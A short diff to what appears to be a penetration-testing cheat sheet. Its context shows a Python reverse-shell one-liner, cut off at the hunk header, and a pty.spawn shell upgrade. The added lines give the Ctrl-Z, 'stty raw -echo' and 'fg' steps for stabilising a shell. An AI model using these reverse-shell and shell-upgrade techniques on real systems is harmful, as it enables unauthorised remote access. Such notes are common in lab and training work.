@@ -94,7 +94,15 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```python
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
-
+```cmd
+Ctrl-Z
+```
+```cmd
+stty raw -echo
+```
+```
+fg
+```
 ## Usefuls Scripts
 ### HEX Converter
 ```bash
